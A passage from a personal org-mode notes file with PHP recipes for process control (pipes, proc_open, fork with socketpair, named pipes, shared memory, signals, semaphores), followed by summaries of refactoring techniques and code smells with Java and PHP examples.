    function filter($output, $mode) {
        $result = array();
        $newline = '';
        if (strlen($output) > 0 && $output[strlen($output) - 1] == "\n") {
            $newline = "\n";
            $output = substr($output, 0, -1);
        }
        foreach (explode("\n", $output) as $i => $line) {
            $result[] = "> $line";
        }
        return implode("\n", $result) . $newline;
    }
}

// Use arrays as callbacks to register filter methods.
ob_start(array(new Head(100), 'filter'));
ob_start(array(new Number(), 'filter'));
ob_start(array(new Quote(), 'filter'));

// Act like /bin/cat.
while (!feof(STDIN)) {
    $line = fgets(STDIN);
    if ($line === false) break;
    echo $line;
}

// Should match number of calls to ob_start().
ob_end_flush();
ob_end_flush();
ob_end_flush();
#+end_src 

** Preprocessing Input

#+begin_src php

// Process command-line arguments using fopen(). PHP supports URLs for
// filenames as long as the "allow_url_fopen" configuration option is set.
//
// Valid URL protocols include:
//   - http://www.myserver.com/myfile.html
//   - ftp://ftp.myserver.com/myfile.txt
//   - compress.zlib://myfile.gz
//   - php://stdin
//
// See http://www.php.net/manual/en/wrappers.php for details.
//
$filenames = array_slice($argv, 1);
if (!$filenames) $filenames = array('php://stdin');
foreach ($filenames as $filename) {
    $handle = @fopen($filename, 'r');
    if ($handle) {
        while (!feof($handle)) {
            $line = fgets($handle);
            if ($line === false) break;
            // ...
        }
        fclose($handle);
    } else {
        die("can't open $filename\n");
    }
}
#+end_src 

** Reading STDERR from a Program
#+begin_src php 
$output = `cmd 2>&1`;                          // with backticks
// or
$ph = popen('cmd 2>&1');                       // with an open pipe
while (!feof($ph)) { $line = fgets($ph); }     // plus a read
// -----------------------------
$output = `cmd 2>/dev/null`;                   // with backticks
// or
$ph = popen('cmd 2>/dev/null');                // with an open pipe
while (!feof($ph)) { $line = fgets($ph); }     // plus a read
// -----------------------------
$output = `cmd 2>&1 1>/dev/null`;              // with backticks
// or
$ph = popen('cmd 2>&1 1>/dev/null');           // with an open pipe
while (!feof($ph)) { $line = fgets($ph); }     // plus a read
// -----------------------------
$output = `cmd 3>&1 1>&2 2>&3 3>&-`;           // with backticks
// or
$ph = popen('cmd 3>&1 1>&2 2>&3 3>&-|');       // with an open pipe
while (!feof($ph)) { $line = fgets($ph); }     // plus a read
// -----------------------------
exec('program args 1>/tmp/program.stdout 2>/tmp/program.stderr');
// -----------------------------
$output = `cmd 3>&1 1>&2 2>&3 3>&-`;
// -----------------------------
$fd3 = $fd1;
$fd1 = $fd2;
$fd2 = $fd3;
$fd3 = null;
// -----------------------------
exec('prog args 1>tmpfile 2>&1');
exec('prog args 2>&1 1>tmpfile');
// -----------------------------
// exec('prog args 1>tmpfile 2>&1');
$fd1 = "tmpfile";        // change stdout destination first
$fd2 = $fd1;             // now point stderr there, too
// -----------------------------
// exec('prog args 2>&1 1>tmpfile');
$fd2 = $fd1;             // stderr same destination as stdout
$fd1 = "tmpfile";        // but change stdout destination
Controlling Input and Output of Another Program

// Connect to input and output of a process.
$proc = proc_open($program,
                  array(0 => array('pipe', 'r'),
                        1 => array('pipe', 'w')),
                  $pipes);
if (is_resource($proc)) {
    fwrite($pipes[0], "here's your input\n");
    fclose($pipes[0]);
    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);
    $result_code = proc_close($proc);
    echo "$result_code\n";
}

// -----------------------------

$all = array();
$outlines = array();
$errlines = array();
exec("( $cmd | sed -e 's/^/stdout: /' ) 2>&1", $all);
foreach ($all as $line) {
    $pos = strpos($line, 'stdout: ');
    if ($pos !== false && $pos == 0) {
        $outlines[] = substr($line, 8);
    } else {
        $errlines[] = $line;
    }
}
print("STDOUT:\n");
print_r($outlines);
print("\n");
print("STDERR:\n");
print_r($errlines);
print("\n");
#+end_src

** Controlling the Input, Output, and Error of Another Program
#+begin_src php
$proc = proc_open($cmd,
                  array(0 => array('pipe', 'r'),
                        1 => array('pipe', 'w'),
                        2 => array('pipe', 'w')),
                  $pipes);

if (is_resource($proc)) {
    // give end of file to kid, or feed him
    fclose($pipes[0]);

    // read till EOF
    $outlines = array();
    while (!feof($pipes[1])) {
        $line = fgets($pipes[1]);
        if ($line === false) break;
        $outlines[] = rtrim($line);
    }

    // XXX: block potential if massive
    $errlines = array();
    while (!feof($pipes[2])) {
        $line = fgets($pipes[2]);
        if ($line === false) break;
        $errlines[] = rtrim($line);
    }

    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($proc);

    print("STDOUT:\n");
    print_r($outlines);
    print("\n");
    print("STDERR:\n");
    print_r($errlines);
    print("\n");
}

// -----------------------------

// cmd3sel - control all three of kids in, out, and error.
$cmd = "grep vt33 /none/such - /etc/termcap";
$proc = proc_open($cmd,
                  array(0 => array('pipe', 'r'),
                        1 => array('pipe', 'w'),
                        2 => array('pipe', 'w')),
                  $pipes);

if (is_resource($proc)) {
    fwrite($pipes[0], "This line has a vt33 lurking in it\n");
    fclose($pipes[0]);

    $readers = array($pipes[1], $pipes[2]);
    while (stream_select($read=$readers,
                         $write=null,
                         $except=null,
                         0, 200000) > 0) {
        foreach ($read as $stream) {
            $line = fgets($stream);
            if ($line !== false) {
                if ($stream === $pipes[1]) {
                    print "STDOUT: $line";
                } else {
                    print "STDERR: $line";
                }
            }
            if (feof($stream)) {
                $readers = array_diff($readers, array($stream));
            }
        }
    }

    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($proc);
}
#+end_src 
** Communicating Between Related Processes
#+begin_src php 
// PHP supports fork/exec/wait but not pipe. However, it does
// support socketpair, which can do everything pipes can as well
// as bidirectional communication. The original recipes have been
// modified here to use socketpair only.

// -----------------------------

// pipe1 - use socketpair and fork so parent can send to child
$sockets = array();
if (!socket_create_pair(AF_UNIX, SOCK_STREAM, 0, $sockets)) {
    die(socket_strerror(socket_last_error()));
}
list($reader, $writer) = $sockets;

$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    socket_close($reader);
    $line = sprintf("Parent Pid %d is sending this\n", getmypid());
    if (!socket_write($writer, $line, strlen($line))) {
        socket_close($writer);
        die(socket_strerror(socket_last_error()));
    }
    socket_close($writer);
    pcntl_waitpid($pid, $status);
} else {
    socket_close($writer);
    $line = socket_read($reader, 1024, PHP_NORMAL_READ);
    printf("Child Pid %d just read this: `%s'\n", getmypid(), rtrim($line));
    socket_close($reader);  // this will happen anyway
    exit(0);
}

// -----------------------------

// pipe2 - use socketpair and fork so child can send to parent
$sockets = array();
if (!socket_create_pair(AF_UNIX, SOCK_STREAM, 0, $sockets)) {
    die(socket_strerror(socket_last_error()));
}
list($reader, $writer) = $sockets;

$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    socket_close($writer);
    $line = socket_read($reader, 1024, PHP_NORMAL_READ);
    printf("Parent Pid %d just read this: `%s'\n", getmypid(), rtrim($line));
    socket_close($reader);
    pcntl_waitpid($pid, $status);
} else {
    socket_close($reader);
    $line = sprintf("Child Pid %d is sending this\n", getmypid());
    if (!socket_write($writer, $line, strlen($line))) {
        socket_close($writer);
        die(socket_strerror(socket_last_error()));
    }
    socket_close($writer);  // this will happen anyway
    exit(0);
}

// -----------------------------

// pipe3 and pipe4 demonstrate the use of perl's "forking open"
// feature to reimplement pipe1 and pipe2. pipe5 uses two pipes
// to simulate socketpair. Since PHP supports socketpair but not
// pipe, and does not have a "forking open" feature, these
// examples are skipped here.

// -----------------------------

// pipe6 - bidirectional communication using socketpair
$sockets = array();
if (!socket_create_pair(AF_UNIX, SOCK_STREAM, 0, $sockets)) {
    die(socket_strerror(socket_last_error()));
}
list($child, $parent) = $sockets;

$pid = pcntl_fork();
if ($pid == -1) {
    die('cannot fork');
} elseif ($pid) {
    socket_close($parent);
    $line = sprintf("Parent Pid %d is sending this\n", getmypid());
    if (!socket_write($child, $line, strlen($line))) {
        socket_close($child);
        die(socket_strerror(socket_last_error()));
    }
    $line = socket_read($child, 1024, PHP_NORMAL_READ);
    printf("Parent Pid %d just read this: `%s'\n", getmypid(), rtrim($line));
    socket_close($child);
    pcntl_waitpid($pid, $status);
} else {
    socket_close($child);
    $line = socket_read($parent, 1024, PHP_NORMAL_READ);
    printf("Child Pid %d just read this: `%s'\n", getmypid(), rtrim($line));
    $line = sprintf("Child Pid %d is sending this\n", getmypid());
    if (!socket_write($parent, $line, strlen($line))) {
        socket_close($parent);
        die(socket_strerror(socket_last_error()));
    }
    socket_close($parent);
    exit(0);
}
#+end_src

** Making a Process Look Like a File with Named Pipes
#+begin_src php 
// -----------------------------
// % mkfifo /path/to/named.pipe
// -----------------------------

$fifo = fopen('/path/to/named.pipe', 'r');
if ($fifo !== false) {
    while (!feof($fifo)) {
        $line = fgets($fifo);
        if ($line === false) break;
        echo "Got: $line";
    }
    fclose($fifo);
} else {
    die('could not open fifo for read');
}

// -----------------------------

$fifo = fopen('/path/to/named.pipe', 'w');
if ($fifo !== false) {
    fwrite($fifo, "Smoke this.\n");
    fclose($fifo);
} else {
    die('could not open fifo for write');
}

// -----------------------------
// % mkfifo ~/.plan                    #  isn't this everywhere yet?
// % mknod  ~/.plan p                  #  in case you don't have mkfifo
// -----------------------------

// dateplan - place current date and time in .plan file
while (true) {
    $home = getenv('HOME');
    $fifo = fopen("$home/.plan", 'w');
    if ($fifo === false) {
        die("Couldn't open $home/.plan for writing.\n");
    }
    fwrite($fifo,
           'The current time is '
           . strftime('%a, %d %b %Y %H:%M:%S %z')
           . "\n");
    fclose($fifo);
    sleep(1);
}

// -----------------------------

// fifolog - read and record log msgs from fifo

$fifo = null;

declare(ticks = 1);
function handle_alarm($signal) {
    global $fifo;
    if ($fifo) fclose($fifo);   // move on to the next queued process
}
pcntl_signal(SIGALRM, 'handle_alarm');

while (true) {
    pcntl_alarm(0);             // turn off alarm for blocking open
    $fifo = fopen('/tmp/log', 'r');
    if ($fifo === false) {
        die("can't open /tmp/log");
    }
    pcntl_alarm(1);             // you have 1 second to log

    $service = fgets($fifo);
    if ($service === false) continue; // interrupt or nothing logged
    $service = rtrim($service);

    $message = fgets($fifo);
    if ($message === false) continue; // interrupt or nothing logged
    $message = rtrim($message);

    pcntl_alarm(0);             // turn off alarms for message processing

    if ($service == 'http') {
        // ignoring
    } elseif ($service == 'login') {
        // log to /var/log/login
        $log = fopen('/var/log/login', 'a');
        if ($log !== false) {
            fwrite($log,
                   strftime('%a, %d %b %Y %H:%M:%S %z')
                   . " $service $message\n");
            fclose($log);
        } else {
            trigger_error("Couldn't log $service $message to /var/log/login\n",
                          E_USER_WARNING);
        }
    }
}
#+end_src 
** Sharing Variables in Different Processes
#+begin_src php 
// sharetest - test shared variables across forks

$SHM_KEY = ftok(__FILE__, chr(1));
$handle = sem_get($SHM_KEY);
$buffer = shm_attach($handle, 1024);

// The original recipe has an INT signal handler here. However, it
// causes erratic behavior with PHP, and PHP seems to do the right
// thing without it.

for ($i = 0; $i < 10; $i++) {
    $child = pcntl_fork();
    if ($child == -1) {
        die('cannot fork');
    } elseif ($child) {
        $kids[] = $child; // in case we care about their pids
    } else {
        squabble();
        exit();
    }
}

while (true) {
    print 'Buffer is ' . shm_get_var($buffer, 1) . "\n";
    sleep(1);
}
die('Not reached');

function squabble() {
    global $handle;
    global $buffer;
    $i = 0;
    $pid = getmypid();
    while (true) {
        if (preg_match("/^$pid\\b/", shm_get_var($buffer, 1))) continue;
        sem_acquire($handle);
        $i++;
        shm_put_var($buffer, 1, "$pid $i");
        sem_release($handle);
    }
}

// Buffer is 14357 1
// Buffer is 14355 3
// Buffer is 14355 4
// Buffer is 14354 5
// Buffer is 14353 6
// Buffer is 14351 8
// Buffer is 14351 9
// Buffer is 14350 10
// Buffer is 14348 11
// Buffer is 14348 12
// Buffer is 14357 10
// Buffer is 14357 11
// Buffer is 14355 13
// ...
#+end_src 

** Listing Available Signals
#+begin_src php
// Available signal constants
% php -r 'print_r(get_defined_constants());' | grep '\[SIG' | grep -v _
    [SIGHUP] => 1
    [SIGINT] => 2
    [SIGQUIT] => 3
    [SIGILL] => 4
    [SIGTRAP] => 5
    [SIGABRT] => 6
    [SIGIOT] => 6
    [SIGBUS] => 7
    [SIGFPE] => 8
    [SIGKILL] => 9
    [SIGUSR1] => 10
    [SIGSEGV] => 11
    [SIGUSR2] => 12
    [SIGPIPE] => 13
    [SIGALRM] => 14
    [SIGTERM] => 15
    [SIGSTKFLT] => 16
    [SIGCLD] => 17
    [SIGCHLD] => 17
    [SIGCONT] => 18
    [SIGSTOP] => 19
    [SIGTSTP] => 20
    [SIGTTIN] => 21
    [SIGTTOU] => 22
    [SIGURG] => 23
    [SIGXCPU] => 24
    [SIGXFSZ] => 25
    [SIGVTALRM] => 26
    [SIGPROF] => 27
    [SIGWINCH] => 28
    [SIGPOLL] => 29
    [SIGIO] => 29
    [SIGPWR] => 30
    [SIGSYS] => 31
    [SIGBABY] => 31

// Predefined signal handler constants
% php -r 'print_r(get_defined_constants());' | grep '\[SIG' | grep _
    [SIG_IGN] => 1
    [SIG_DFL] => 0
    [SIG_ERR] => -1
#+end_src

** Sending a Signal
#+begin_src php 
// send pid a signal 9
posix_kill($pid, 9);
// send whole job a signal 1
posix_kill($pgrp, -1);
// send myself a SIGUSR1
posix_kill(getmypid(), SIGUSR1);
// send a SIGHUP to processes in pids
foreach ($pids as $pid) posix_kill($pid, SIGHUP);

// -----------------------------

// Use kill with pseudo-signal 0 to see if process is alive.
if (posix_kill($minion, 0)) {
    echo "$minion is alive!\n";
} else {
    echo "$minion is deceased.\n";
}
#+end_src 

** Installing a Signal Handler
#+begin_src php 
// call got_sig_quit for every SIGQUIT
pcntl_signal(SIGQUIT, 'got_sig_quit');
// call got_sig_pipe for every SIGPIPE
pcntl_signal(SIGPIPE, 'got_sig_pipe');
// increment ouch for every SIGINT
function got_sig_int($signal) { global $ouch; $ouch++; }
pcntl_signal(SIGINT, 'got_sig_int');
// ignore the signal INT
pcntl_signal(SIGINT, SIG_IGN);
// restore default STOP signal handling
pcntl_signal(SIGSTOP, SIG_DFL);
#+end_src 

** Temporarily Overriding a Signal Handler

#+begin_src php 
// the signal handler
function ding($signal) {
    fwrite(STDERR, "\x07Enter your name!\n");
}

// prompt for name, overriding SIGINT
function get_name() {
    declare(ticks = 1);
    pcntl_signal(SIGINT, 'ding');

    echo "Kindly Stranger, please enter your name: ";
    while (!@stream_select($read=array(STDIN),
                           $write=null,
                           $except=null,
                           1)) {
        // allow signals to be observed
    }
    $name = fgets(STDIN);

    // Since pcntl_signal() doesn't return the old signal handler, the
    // best we can do here is set it back to the default behavior.
    pcntl_signal(SIGINT, SIG_DFL);

    return $name;
}
#+end_src 

** Writing a Signal Handler
#+begin_src php 
function got_int($signal) {
    pcntl_signal(SIGINT, 'got_int');  // but not for SIGCHLD!
    // ...
}
pcntl_signal(SIGINT, 'got_int');

// -----------------------------

declare(ticks = 1);
$interrupted = false;

function got_int($signal) {
    global $interrupted;
    $interrupted = true;
    // The third argument to pcntl_signal() determines if system calls
    // should be restarted after a signal. It defaults to true.
    pcntl_signal(SIGINT, 'got_int', false);  // or SIG_IGN
}
pcntl_signal(SIGINT, 'got_int', false);

// ... long-running code that you don't want to restart

if ($interrupted) {
    // deal with the signal
}
#+end_src 

** Catching Ctrl-C
#+begin_src php 
// ignore signal INT
pcntl_signal(SIGINT, SIG_IGN);

// install signal handler
declare(ticks = 1);
function tsktsk($signal) {
    fwrite(STDERR, "\x07The long habit of living indisposeth us for dying.");
    pcntl_signal(SIGINT, 'tsktsk');
}
pcntl_signal(SIGINT, 'tsktsk');
#+end_src 

** Avoiding Zombie Processes
#+begin_src php 
pcntl_signal(SIGCHLD, SIG_IGN);

// -----------------------------

declare(ticks = 1);
function reaper($signal) {
    $pid = pcntl_waitpid(-1, $status, WNOHANG);
    if ($pid > 0) {
        // ...
        reaper($signal);
    }
    // install *after* calling waitpid
    pcntl_signal(SIGCHLD, 'reaper');
}
pcntl_signal(SIGCHLD, 'reaper');

// -----------------------------

declare(ticks = 1);
function reaper($signal) {
    $pid = pcntl_waitpid(-1, $status, WNOHANG);
    if ($pid == -1) {
        // No child waiting. Ignore it.
    } else {
        if (pcntl_wifexited($signal)) {
            echo "Process $pid exited.\n";
        } else {
            echo "False alarm on $pid\n";
        }
        reaper($signal);
    }
    pcntl_signal(SIGCHLD, 'reaper');
}
pcntl_signal(SIGCHLD, 'reaper');
#+end_src 

** Blocking Signals
#+begin_src php 
// PHP does not support sigprocmask().
Timing Out an Operation

declare(ticks = 1);
$aborted = false;

function handle_alarm($signal) {
    global $aborted;
    $aborted = true;
}
pcntl_signal(SIGALRM, 'handle_alarm');

pcntl_alarm(3600);
// long-time operations here
pcntl_alarm(0);
if ($aborted) {
    // timed out - do what you will here
}
#+end_src

* Semaphores
A basic form of interaction between programs is negotiation over shared resources. If you have a data source,
peripheral, data set, or any other kind of resource that you want only one program to access at a time, you
need some form of communication between the programs to decide who is using it and to work out when
they have finished with it. Since the advent of System V, Unix has had the concept of semaphores to manage
this process. PHP embodies their use in the sysvsem extension, which is usually already compiled into most
PHP distributions on Unix and Linux systems. Semaphores are like a flag that gets passed around, and only
the program holding the flag can access the resource. The following code shows an example of passing a
semaphore. Open two shell windows and run the script in each one. You will see the scripts getting and
releasing the semaphore, such that at any one time, only one script will have the semaphore.
#+begin_src php 
<?php
$process = getmypid();
$semaphore = sem_get('123456', 1, 0666, 1);
if (!$semaphore) { echo("Couldn't get semaphore\n"); exit;};
while (1) {
  sem_acquire($semaphore);
  echo ($process." has the semaphore\n");
  sleep(rand(0,5));
  if (!sem_release($semaphore)) {
    echo("Couldn't release semaphore\n");
    exit;
  };
  echo ($process." has released the semaphore\n");
};
#+end_src

First you get the pid (process ID) of your script to be sure you are running different processes. Next,
you create a semaphore by using sem_get() and return an ID for that semaphore (you can run multiple
semaphores for different reasons at the same time, so the ID is important). If another script has already
created it, this will just return the ID. Note that all of your scripts/programs that want to share a particular
semaphore must use the same parameters for the sem_get() function (or its equivalent in another
language); otherwise, a new semaphore will be created. The first parameter for sem_get() is a unique integer
key that identifies the semaphore (this is different from the ID returned by the sem_get() function, which is
PHP’s internal resource ID for the semaphore and will vary from script to script for the same semaphore).
The second parameter is the number of unique users permitted to hold the semaphore at any one time. This
allows you to, for instance, allow two (or more) people to “hold the flag” at the same time, which can be used
to place an upper limit on the number of simultaneous users of a resource. The third parameter specifies the
standard Unix permissions (as you would use with chmod, for instance), and the fourth parameter specifies
whether to automatically release the semaphore if the request goes away.
Once you have your semaphore set up, you then enter a loop. Each time through the loop you try to get
the flag with sem_aquire(). This is a blocking function, which means that your program will sit and wait
until the semaphore is available and you can grab it. Once you have it, the program will continue. You sleep
for a random time (in “real life” you would do something useful with the resource you are protecting with the
semaphore), and then release it back again. At this point, the next waiting process will pounce in and “grab
the flag,” as you go back to the start of the loop and try to acquire it again.
It’s important to note that semaphores work on the honor system. Every program is expected to
implement and respect the semaphore. The system itself doesn’t know about or enforce semaphores,
so a rogue program can simply nip in and use the resource regardless of who is “holding the flag.” Thus
semaphores shouldn’t be used for any systems that you don’t absolutely control (or don’t mind if unentitled
software grabs your resource), and only where all programs want to share the resource. There is also little
protection against deadlocks, whereby one program gets the semaphore and fails to release it due to an error
with that program. The final parameter of the sem_get() function does allow for the automatic releasing of
the semaphore if the request disappears (for example, if the process crashes or the semaphore is closed in
the current script with sem_remove()), but this may not protect against the process simply hanging.
* refactoring
** Replace Temp with Query

You are using a temporary variable to hold the result of an expression.

Extract the expression into a method. Replace all references to the temp with
the expression. The new method can then be used in other methods.

** Inline Method
   
A method's body is just as clear as its name.

Put the method's body into the body of its callers and remove the method.

#+begin_src java
int getRating() {
  return (moreThanFiveLateDeliveries()) ? 2 : 1;
}
boolean moreThanFiveLateDeliveries() {
  return _numberOfLateDeliveries > 5;
}

//refactored
int getRating() {
  return (_numberOfLateDeliveries > 5) ? 2 : 1;
}
#+end_src 

inverse of Extract Method

** Inline Temp

You have a temp that is assigned to once with a simple expression, and the temp
is getting in the way of other refactorings.

Replace all references to that temp with the expression.

#+begin_src java
double basePrice = anOrder.basePrice();
return (basePrice > 1000)

//refactored
return (anOrder.basePrice() > 1000)
#+end_src 

** Replace Temp with Query

You are using a temporary variable to hold the result of an expression.

Extract the expression into a method. Replace all references to the temp with
the expression. The new method can then be used in other methods.

#+begin_src java
double basePrice = _quantity * _itemPrice;
if (basePrice > 1000)
  return basePrice * 0.95;
else
  return basePrice * 0.98;

// refactored
if (basePrice() > 1000)
  return basePrice() * 0.95;
else
  return basePrice() * 0.98;
...
double basePrice() {
  return _quantity * _itemPrice;
}
#+end_src 

** Extract Variable
You have a complicated expression.

Put the result of the expression, or parts of the expression, in a temporary
variable with a name that explains the purpose.

#+begin_src java
if ( (platform.toUpperCase().indexOf("MAC") > -1) &&
     (browser.toUpperCase().indexOf("IE") > -1) &&
      wasInitialized() && resize > 0 )
{
  // do something
}

//refactored
final boolean isMacOs     = platform.toUpperCase().indexOf("MAC") > -1;
final boolean isIEBrowser = browser.toUpperCase().indexOf("IE")  > -1;
final boolean wasResized  = resize > 0;

if (isMacOs && isIEBrowser && wasInitialized() && wasResized)
{
  // do something
}
#+end_src 

inverse of Inline Temp

** Split Temporary Variable

You have a temporary variable assigned to more than once, but is not a loop
variable nor a collecting temporary variable.

Make a separate temporary variable for each assignment.

#+begin_src java
  double temp = 2 * (_height + _width);
  System.out.println (temp);
  temp = _height * _width;
  System.out.println (temp);

//refactored
  final double perimeter = 2 * (_height + _width);
  System.out.println (perimeter);
  final double area = _height * _width;
  System.out.println (area);
#+end_src 

** Replace Method with Method Object

You have a long method that uses local variables in such a way that you cannot apply Extract Method

Turn the method into its own object so that all the local variables become
fields on that object. You can then decompose the method into other methods on
the same object.

#+begin_src java
class Order...
double price() {
  double primaryBasePrice;
  double secondaryBasePrice;
  double tertiaryBasePrice;
  // long computation;
  ...
}
#+end_src 

** Substitute Algorithm

You want to replace an algorithm with one that is clearer.

Replace the body of the method with the new algorithm.

#+begin_src java
String foundPerson(String[] people){
  for (int i = 0; i < people.length; i++) {
    if (people[i].equals ("Don")){
      return "Don";
    }
    if (people[i].equals ("John")){
      return "John";
    }
    if (people[i].equals ("Kent")){
      return "Kent";
    }
  }
  return "";
}

//refactored
String foundPerson(String[] people){
  List candidates = Arrays.asList(new String[] {"Don", "John", "Kent"});
  for (int i=0; i<people.length; i++)
    if (candidates.contains(people[i]))
      return people[i];
  return "";
}
#+end_src 

** Move Method

A method is, or will be, using or used by more features of another class than the class on which it is defined.

Create a new method with a similar body in the class it uses most. Either turn
the old method into a simple delegation, or remove it altogether.
Additions

Marian Vittek sent an example for moving a method to a method argument.

#+begin_src  java
class Project {
  Person[] participants;
}

class Person {
  int id;
  boolean participate(Project p) {
    for(int i=0; i<p.participants.length; i++) {
	  if (p.participants[i].id == id) return(true);
    }
    return(false);
  }   
}

... if (x.participate(p)) ...

After applying the move you end up with

class Project {
  Person[] participants;
  boolean participate(Person x) {
    for(int i=0; i<participants.length; i++) {
	  if (participants[i].id == x.id) return(true);
    }
    return(false);
  }   
}

class Person {
  int id;
}

... if (p.participate(x)) ...
#+end_src 

** Move Field

A field is, or will be, used by another class more than the class on which it is defined.

Create a new field in the target class, and change all its users.
** Extract Class

You have one class doing work that should be done by two.

Create a new class and move the relevant fields and methods from the old class into the new class.
** Inline Class

A class isn't doing very much.

Move all its features into another class and delete it.

** Hide Delegate

A client is calling a delegate class of an object.

Create methods on the server to hide the delegate.

** Remove Middle Man

A class is doing too much simple delegation.

Get the client to call the delegate directly.
** Introduce Foreign Method

A server class you are using needs an additional method, but you can't modify the class.

Create a method in the client class with an instance of the server class as its first argument.
#+begin_src java
Date newStart = new Date (previousEnd.getYear(),
previousEnd.getMonth(), previousEnd.getDate() + 1);

Date newStart = nextDay(previousEnd);

private static Date nextDay(Date arg) {
  return new Date (arg.getYear(),arg.getMonth(), arg.getDate() + 1);
}
#+end_src 

** Form Template Method

You have two methods in subclasses that perform similar steps in the same order,
yet the steps are different.

Get the steps into methods with the same signature, so that the original methods
become the same. Then you can pull them up.

** extract class 
You have one class doing work that should be done by two.

Create a new class and move the relevant fields and methods from the old class
into the new class.

** Extract Subclass

A class has features that are used only in some instances.

Create a subclass for that subset of features.

** Extract Superclass

You have two classes with similar features.

Create a superclass and move the common features to the superclass.

inverse of Collapse Hierarchy

** Inline Class

A class isn't doing very much.

Move all its features into another class and delete it.

** Introduce Class Annotation

You have a method whose implementation steps are so common that they can safely
be hidden away.

Declare the behavior by calling a class method from the class definition.

** Replace Record with Data Class

You need to interface with a record structure in a traditional programming
environment.

Make a dumb data object for the record.

** Replace Subclass with Fields

You have subclasses that vary only in methods that return constant data.

Change the methods to superclass fields and eliminate the subclasses.

** Replace Type Code with Class

A class has a numeric type code that does not affect its behavior.

Replace the number with a new class.

** Replace Type Code with Subclasses

You have an immutable type code that affects the behavior of a class.

Replace the type code with subclasses.




** by smell
*** Duplicate code strategies
**** Extract method
**** Pull up field
**** form template method
**** substitude algoirthm
*** Long method
**** intro
The most common strategy to refactor this type of software is the *extract method*. We find pieces of
code that go great together and put them in an external method. One heuristic method that we can use
to correctly separate the code is to follow the comments. Since reading long code is very difficult,
diligent programmers often comment on blocks of code that explain what they do. Here, every time we
encounter a comment, we can

  1. Write a new method in the same class (the name should represent what the
     code does)

  2. Move the block of code under the comment from the routine to the new method

  3. Add a comment that explains not what method does but how it does it.

We can also create new methods that contain only a single line of code, if the
name of the new method explains better what the code does. The key to this
strategy is not so much the length of the method, but the semantic distance
between what the method does and how it does it.

**** extract method
**** move method
*** Large class
**** intro
A class that tries to do too many things can be easily distinguished by the number of attributes it
possesses. When a class has too many attributes, it is very easy to create duplicate code, making it
difficult to maintain and read.
The two best strategies are to combine the attributes that go well together, such as attributes with
the same prefixes or suffixes, e.g., home_address and office_address, or fax_number and
phone_number, and extract new classes that include these similar attributes. If the attributes belong
strongly to class and can’t be merged, but they are used differently in different instances of the same
class, we can extract subclasses and divide these attributes in these subclasses.

**** extract class
**** extract subclass
*** Long parameter list
**** intro
With procedural programming we often use lots of long lists of parameters passed to functions.
Unfortunately, this method used to be mandatory, since the only alternative was to use global variables,
which, we know, are evil. With object-oriented programming, luckily, we no longer need long lists of
parameters, for two main reasons:

 1. There are objects.
 2. A class method knows all private, protected, and public parameters of the
    class where it’s implemented and all protected and public parameters of the
    inherit class.

Moreover, when we have parameters that can be grouped into a single object we can introduce a
parameter object and pass it directly to the method rather than individual parameters. Instead, if we are
passing the individual attributes of the same object, we can preserve the whole object and pass the
object directly. If we invoke a method and then pass the result directly to another method, we can
replace the parameter with the method and call it directly into the later-invoked method.
The only exception for which these strategies can’t be applied is when we don’t want to create
dependency between object and class. In this case we can pass all the attributes separately, but we must
be aware of what this means. Before making this decision we have to review the design of our
application to understand whether we can improve it to avoid a bad smell.

**** Replace parameter with method
**** Preserve whole object
**** introduce parameter object
*** Divergent Change
**** intro
When we change a certain feature in software that is truly moldable, we should be able to make the
change in a single clear point of our system. When this doesn’t happen, and, instead, we must change
multiple methods of the same class to make different changes, then we have done something wrong.

For example, if we have to modify two methods of the same class to change the database
connection, and we have to change four methods to add a new graphical interface to a particular
component in the same class, it is probably better to split this class into two classes, so as to isolate the
change in a single point. The strategy applied is the extract class. We create a new class; we extract the
common methods in the new class and let it communicate in some way.
**** Extract class
*** Shotgun Surgery
**** intro
This bad smell is the perfect opposite of the previous divergent change. In
practice, when we have to modify many classes to make a single change, this
means that we have a design overhead.

When we have to change two different methods of two different classes, we can
move the method in the most representative class. If we instead have to change
attributes of different classes, we can move only attributes in the most
representative class. Sometimes we might remove all classes and move all
attributes within the class that uses it. This strategy takes the name of inline
class.

**** Move method
**** Move field
**** inline class
*** Feature Envy 
**** intro
When we write our software, we must never forget that an object is a set of data and processes that
compute these data. This thought should help us to identify all the methods that do not process the data
in our class, but data of the other classes, invoking only external methods. As you can imagine, these
methods are in the wrong position. To resolve this situation we can simply move the method from one
class to another.
If only a part of the code must be moved, first extract it in a new method and then move it. If our
code actually invokes methods of different classes, it can sometimes be complex to figure out where to
move the method. When we are in trouble, the strategy is always the same—extract more methods and
move everyone in your class.
**** Move method
**** Extract method
*** Primitive Obsession
Many programming languages, including PHP, provide two basic data types—the primitive type and
structured type, which we represent with associative arrays in PHP. The structured data is used when
none of the system primitives provided can properly represent certain data. A very common example is a
record in a database, or a matrix. These data types are often duplicated within our code and, as we have
seen before, are not good, because the duplicated code is the first bad smell. In this case the objects are
the solution to our problem. The object itself is just the right compromise between primitive data and
structured data.

To implement this type of class, the strategy that we can use is to replace data value with an object,
but if we find type code that is an alias for a structured data, we can replace it with a class or subclass it
represents. If we have a condition that depends on the type of a given data, we can replace type code
with a subclass or with a state/strategy pattern.
In the following example we retrieve a record from a database, fetching it with array hydration mode.

#+begin_src php 

$id = 0;
$db = new PDO('mysql:dbname=mytest', 'root');
$stmt = $db->prepare('SELECT * FROM user WHERe id = :id');
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
$user = $stmt->fetch(PDO::FETCH_ASSOC);
echo $user['firstname'], ' ', $user['lastname'], PHP_EOL;
Instead we can define a User class and use it to hydrate query result.
class User
{
  protected $firstname;
    protected $lastname;
  public function __toString()
  {
    return $this->firstname. ' '. $this->lastname;
  }
}
...
$stmt->execute();
$user = $stmt->fetchObject('User');
echo $user, PHP_EOL;
#+end_src 

**** Refactoring Strategies
**** Replace data value with object
**** Replace type code with class
**** Replace type code with subclasses
**** Replace type code with state/strategy
*** Switch statements
**** intro
Another widespread bad smell is the use of repeated and duplicate switches. The switch control
structure usually seeks to change the behavior or the state of an object based on one or more
parameters. Using switches in this way, we forget that in object-oriented programming this type of
behavior has the name “polymorphism” and is a property of objects themselves.

Through the polymorphism property we can remove conditional logic, since the change occurs
according to the type of the object itself, not because someone knows how to choose based on the value
